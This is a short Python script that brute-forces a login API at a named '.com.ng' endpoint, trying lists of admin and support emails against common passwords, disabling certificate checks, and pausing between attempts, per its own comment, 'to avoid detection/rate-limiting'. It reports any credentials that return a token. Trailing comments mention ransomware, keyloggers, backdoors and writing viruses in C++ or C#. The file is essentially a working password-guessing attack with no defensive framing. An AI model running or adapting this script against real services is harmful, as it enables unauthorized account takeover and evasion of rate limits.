import requests
import json
import time


# 🔗 API endpoint for login
url = "https://apimypromospheretest.com.ng/api/login"

# www.facebook.com/api/9ja/login
#  jij  , anyurl ,

# 📧 List of target emails
emails = [
    "admin@site.com",
    "support@site.com",
    "testing@gmail.com"
]

# 🔑 List of passwords to try
passwords = [
    "admin123",
    "mypromo2024",
    "password123",
    "123456",
    # mypassword , pass1234 ,  admin22.
    "testing@gmail.com"
]

# Optional: Proxy through Burp Suite to watch traffic (remove if not needed)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 🧠 Loop through all email-password combinations
for email in emails:
    for password in passwords:
        payload = {
            "email": email,
            "password": password
        }
        headers = {
            "Content-Type": "application/json"
        }

        print(f"[*] Trying: {email}:{password}")
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload),
                # Uncomment the next line if using Burp
                # proxies=proxies,
                verify=False  # Disable SSL warning
            )

            if response.status_code == 200 and "token" in response.text:
                print(f"[+] SUCCESS: {email}:{password}")
                print("🔐 Response:", response.text)
                exit(0)  # Exit after first success
            else:
                print(f"[-] Failed: {email}:{password}")

            # Optional: Delay to avoid detection/rate-limiting
            time.sleep(12)

        except Exception as e:
            print(f"[!] Error: {e}")    



# python   automation , ransomeware  , keylogger 
# if your  goal is create viurs / malware .  c++ or  c#  

# backdoor .
